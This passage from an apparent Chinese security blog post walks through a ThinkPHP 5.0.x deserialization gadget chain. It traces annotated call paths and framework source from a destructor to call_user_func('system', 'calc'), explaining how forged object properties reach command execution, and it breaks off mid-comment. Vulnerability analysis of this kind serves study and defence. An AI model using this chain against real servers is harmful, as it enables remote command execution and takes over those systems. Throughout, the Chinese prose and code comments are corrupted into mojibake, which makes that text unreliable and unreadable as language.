<li><p><strong>ååºåˆ—åŒ–å¯¹è±¡</strong> ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE2.svg"
                      alt="TPRCE2"
                ></p>
</li>
<li><p><strong>ååºåˆ—åŒ–è°ƒç”¨é“¾</strong> ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">    â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>)</span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)                  <span class="comment">// âœ… è§¦å‘ __toString()</span></span><br><span class="line"></span><br><span class="line">think\model\Pivot-&gt;<span class="title function_ invoke__">__toString</span>()                     <span class="comment">// ä» Model æŠ½è±¡ç±»ç»§æ‰¿</span></span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">toJson</span>()</span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">toArray</span>()</span><br><span class="line">        â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$name</span>)        <span class="comment">// âœ… æ„é€  $this-&gt;append = [&#x27;getError&#x27;]</span></span><br><span class="line">            â””â”€â”€ <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$name</span>)         <span class="comment">// âœ… getError å­˜åœ¨</span></span><br><span class="line">                â””â”€â”€ <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>() <span class="comment">// âœ… è¿”å› HasOne å¯¹è±¡</span></span><br><span class="line">                â””â”€â”€ <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>)</span><br><span class="line">                     â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> !== <span class="literal">null</span>                             <span class="comment">// âœ… Pivot-&gt;parent = Output</span></span><br><span class="line">                     â””â”€â”€ !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>()                  <span class="comment">// âœ… HasOne-&gt;selfRelation = false</span></span><br><span class="line">                     â””â”€â”€ <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)</span><br><span class="line">                         â””â”€â”€ <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>                           <span class="comment">// âœ… è¿”å› Output å¯¹è±¡</span></span><br><span class="line">                â””â”€â”€ <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>()              <span class="comment">// âœ… è¿”å› [&#x27;no&#x27;]</span></span><br><span class="line">                     â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$attr</span>)</span><br><span class="line">                          â””â”€â”€ <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>)                        <span class="comment">// âœ… Output æ²¡æœ‰ getAttrï¼Œè¿›å…¥ __call()</span></span><br><span class="line"></span><br><span class="line">think\console\Output-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getAttr&quot;</span>, [<span class="string">&quot;no&quot;</span>])</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles))                  <span class="comment">// âœ… æ„é€  $this-&gt;styles = [&#x27;getAttr&#x27;]</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>)                      <span class="comment">// âœ… $args = [&#x27;getAttr&#x27;, &#x27;no&#x27;]</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], [<span class="string">&#x27;getAttr&#x27;</span>, <span class="string">&#x27;no&#x27;</span>])</span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">block</span>(<span class="string">&quot;getAttr&quot;</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">            â””â”€â”€ <span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>)</span><br><span class="line">                â””â”€â”€ <span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">0</span>)</span><br><span class="line">                    â””â”€â”€ <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">0</span>)  <span class="comment">// âœ… $this-&gt;handle ä¸º Memcached</span></span><br><span class="line"></span><br><span class="line">think\session\driver\Memcached-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$expire</span>)</span><br><span class="line">â””â”€â”€ <span class="variable">$sessID</span> = <span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="variable">$sessData</span> = <span class="literal">true</span>, <span class="variable">$expire</span> = <span class="number">3600</span></span><br><span class="line">â””â”€â”€ <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&quot;HEXENS&quot;</span> . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$expire</span>)</span><br><span class="line">     â†’ <span class="title function_ invoke__">set</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">3600</span>)</span><br><span class="line"></span><br><span class="line">think\cache\driver\Memcache-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">3600</span>)</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) â†’ <span class="literal">false</span>                   <span class="comment">// âœ… $expire = 3600ï¼Œä¸ä¸ºç©º</span></span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) â†’ <span class="literal">false</span>       <span class="comment">// âœ… $expire æ˜¯æ•´æ•°ï¼Œä¸æ˜¯å¯¹è±¡</span></span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>))           <span class="comment">// âœ… $this-&gt;tag = trueï¼Œæ‰§è¡Œ $this-&gt;has()</span></span><br><span class="line">    â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>)</span><br><span class="line">        â””â”€â”€ <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)         </span><br><span class="line">             â†’ <span class="variable">$key</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">        â””â”€â”€ <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)</span><br><span class="line">            â””â”€â”€ <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>       <span class="comment">// âœ… é»˜è®¤ $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27;</span></span><br><span class="line">                â””â”€â”€ <span class="variable">$key</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>      <span class="comment">// âœ… ä¿æŒé”®ååŸæ ·ä¸å˜</span></span><br><span class="line">        â””â”€â”€ <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>)                <span class="comment">// âœ… handler æ˜¯ think\Request å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">think\Request-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>)</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>) â†’ <span class="literal">true</span></span><br><span class="line">         â””â”€â”€ <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>)</span><br><span class="line">              â””â”€â”€ <span class="variable">$name</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span>                   <span class="comment">// âœ… &#x27;/&#x27; è¢«å½“ä½œç±»å‹åˆ†éš”ç¬¦ï¼Œä¿ç•™ &#x27;&lt;&#x27;</span></span><br><span class="line">              â””â”€â”€ <span class="variable">$type</span> = <span class="string">&quot;getAttr&gt;&quot;</span></span><br><span class="line">    â””â”€â”€ <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>))                           <span class="comment">// âœ… æ—  &#x27;.&#x27;ï¼Œå•æ®µå­—æ®µ</span></span><br><span class="line">         â””â”€â”€ <span class="variable">$val</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span></span><br><span class="line">         â””â”€â”€ <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;get[<span class="variable">$val</span>]                           <span class="comment">// âœ… å‘½ä¸­é”®åï¼Œå–å‡º &#x27;calc&#x27;</span></span><br><span class="line">              â””â”€â”€ <span class="variable">$value</span> = <span class="string">&#x27;calc&#x27;</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>)</span><br><span class="line">         â””â”€â”€ <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter = <span class="string">&#x27;system&#x27;</span>         <span class="comment">// âœ… è®¾ç½®é»˜è®¤è¿‡æ»¤å™¨</span></span><br><span class="line">         â””â”€â”€ <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>) â†’ [<span class="string">&#x27;system&#x27;</span>]                    <span class="comment">// âœ… ç”Ÿæˆè¿‡æ»¤å™¨å‡½æ•°åæ•°ç»„</span></span><br><span class="line">         â””â”€â”€ <span class="variable">$filter</span>[] = <span class="variable">$default</span> = <span class="literal">null</span>                           <span class="comment">// âœ… æœ€ç»ˆ filters = [&#x27;system&#x27;, null]</span></span><br><span class="line">    â””â”€â”€ <span class="variable">$filters</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="literal">null</span>]</span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">filterValue</span>(<span class="variable">$value</span> = <span class="string">&#x27;calc&#x27;</span>, <span class="variable">$key</span> = <span class="string">&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27;</span>, <span class="variable">$filters</span>)</span><br><span class="line">         â””â”€â”€ <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>) â†’ <span class="literal">null</span>                 <span class="comment">// âœ… å¼¹å‡º nullï¼Œå‰© [&#x27;system&#x27;]</span></span><br><span class="line">         â””â”€â”€ <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>)</span><br><span class="line">              â””â”€â”€ <span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>) = <span class="literal">true</span></span><br><span class="line">              â””â”€â”€ <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span> = <span class="string">&#x27;system&#x27;</span>, <span class="variable">$value</span> = <span class="string">&#x27;calc&#x27;</span>)   <span class="comment">// âœ… å‘½ä»¤æ‰§è¡Œç‚¹</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="è°ƒç”¨é“¾åˆ†æ-1"><a href="#è°ƒç”¨é“¾åˆ†æ-1" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h3><p>é¦–å…ˆè°ƒç”¨é“¾å‰åŠéƒ¨åˆ†ä¸ RCE1 ç›¸åŒï¼Œåªä¸è¿‡ 5.0.x ç‰ˆæœ¬çš„ ThinkPHP çš„æ²¡æœ‰ <code>think\model\concern\Conversion</code>  å’Œ <code>think\model\concern\Attribute</code> è¿™ä¸¤ä¸ª traitï¼Œä¹Ÿå°±æ˜¯è¯´ <code>think\model\Pivot</code> çš„ <code>__toString</code> ç­‰æ–¹æ³•éƒ½æ˜¯é€šè¿‡ç»§æ‰¿æŠ½è±¡ç±» <code>Model</code> è·å¾—çš„ã€‚</p>
<p>å› æ­¤è°ƒç”¨é“¾ä¸ºï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">  â””â”€â”€ think\process\pipes\Windows-&gt;<span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">      â””â”€â”€ <span class="title function_ invoke__">file_exists</span>()</span><br><span class="line">          â””â”€â”€ think\model\Pivot-&gt;<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">              â””â”€â”€ think\model\Pivot-&gt;<span class="title function_ invoke__">toJson</span>()</span><br><span class="line">                  â””â”€â”€ think\model\Pivot-&gt;<span class="title function_ invoke__">toArray</span>()</span><br><span class="line">                      â””â”€â”€ think\console\Output-&gt;<span class="title function_ invoke__">getAttr</span>()</span><br></pre></td></tr></table></figure></div>

<p><code>think\model\Pivot-&gt;toArray</code> æ–¹æ³•åœ¨ 5.0.x çš„å®ç°å’Œå‰é¢çš„ 5.1.x ä¸åŒï¼Œå¹¶ä¸”ç»•è¿‡è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ã€‚è¿™ä¸ªå‡½æ•°æœ€ç»ˆæ‰§è¡Œçš„æ•ˆæœå°±æ˜¯è°ƒç”¨åˆ° <code>think\console\Output-&gt;getAttr</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* è½¬æ¢å½“å‰æ¨¡å‹å¯¹è±¡ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="comment">* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span>    = [];</span><br><span class="line">    <span class="variable">$visible</span> = [];</span><br><span class="line">    <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// $this-&gt;data å’Œ $this-&gt;relation å‡ä¸ºç©ºï¼Œå› æ­¤ $data ä¹Ÿä¸ºç©º</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿‡æ»¤å±æ€§</span></span><br><span class="line">    <span class="comment">// å±æ€§è¿‡æ»¤ï¼ˆ$this-&gt;visible å’Œ $this-&gt;hidden éƒ½ä¸ºç©ºï¼Œå› æ­¤ä¸è¿›å…¥ä»»ä½•è¿‡æ»¤åˆ†æ”¯ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123; </span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå† $data æ„å»ºå±æ€§é¡¹ï¼ˆä½† $data ä¸ºç©ºï¼Œä¸è¿›å…¥å¾ªç¯ï¼‰</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">    <span class="comment">// $this-&gt;append = [&#x27;getError&#x27;]</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// $this-&gt;append çš„å”¯ä¸€ä¸€é¡¹çš„å€¼ä¸º &quot;getError&quot; å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="comment">// å³ $name = &quot;getError&quot;ï¼Œè¿›å…¥å¸¸è§„å­—ç¬¦ä¸²åˆ†æ”¯ï¼ˆä¸æ˜¯æ•°ç»„ï¼Œä¹Ÿä¸åŒ…å«ç‚¹å·ï¼‰</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// ç»Ÿä¸€ä¸ºå°é©¼å³°ï¼ˆå¦‚ &#x27;getError&#x27; =&gt; &#x27;getError&#x27;ï¼Œæ— å˜åŒ–ï¼‰</span></span><br><span class="line">                <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// think\model\Pivot ç»§æ‰¿äº† Model çš„ getError æ–¹æ³•ï¼Œå› æ­¤è¿›å…¥ if</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123; </span><br><span class="line">                    <span class="comment">// è°ƒç”¨ $this-&gt;getError å‡½æ•°å¾—åˆ° $this-&gt;error</span></span><br><span class="line">                    <span class="comment">// è¿™é‡Œæ˜¯ä¸€ä¸ª think\model\relation\HasOne å¯¹è±¡</span></span><br><span class="line">                    <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// é€šè¿‡ç²¾ç¡®ä¼ªé€  HasOne å’Œ Pivot å¯¹è±¡ç»“æ„ï¼Œä½¿ getRelationData()</span></span><br><span class="line">                    <span class="comment">// è¿”å› $this-&gt;parentï¼Œå³ think\console\Output å¯¹è±¡ï¼ˆä¸ºåç»­ __call é“ºè·¯ï¼‰</span></span><br><span class="line">                    <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// HasOne å¯¹è±¡å­˜åœ¨ getBindAttr æ–¹æ³•ï¼Œè¿›å…¥ if</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="comment">// è°ƒç”¨ getBindAttr æ–¹æ³•è¿”å› $modelRelation-&gt;bindAttr</span></span><br><span class="line">                        <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                            <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// $this-&gt;data ä¸ºç©ºï¼Œè¿›å…¥ else åˆ†æ”¯</span></span><br><span class="line">                                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="comment">// åœ¨è¿™é‡Œè°ƒç”¨åˆ° $value-&gt;getAttr æ–¹æ³•</span></span><br><span class="line">                                    <span class="comment">// $value æ˜¯ think\console\Output å¯¹è±¡ï¼Œæ²¡æœ‰ getAttr æ–¹æ³•</span></span><br><span class="line">                                    <span class="comment">// å› æ­¤ä¼šè°ƒç”¨åˆ° think\console\Output-&gt;__Call æ–¹æ³•</span></span><br><span class="line">                                    <span class="comment">// ä¼ å…¥çš„å‚æ•° $attr æ˜¯ $bindAttr æ•°ç»„ä¸­çš„å€¼ï¼Œå³ &quot;no&quot; å­—ç¬¦ä¸²</span></span><br><span class="line">                                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>Model</code> çš„ <code>getRelationData</code> æ–¹æ³•å¯ä»¥é€šè¿‡æ„é€  <code>Pivot</code> å¯¹è±¡ä½¿å…¶è¿”å›å¯æ§çš„ <code>Pivot-&gt;parent</code> å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å…³è”æ¨¡å‹æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> Relation        $modelRelation æ¨¡å‹å…³è”å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> BadMethodCallException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å‚æ•° $modelRelation å³ 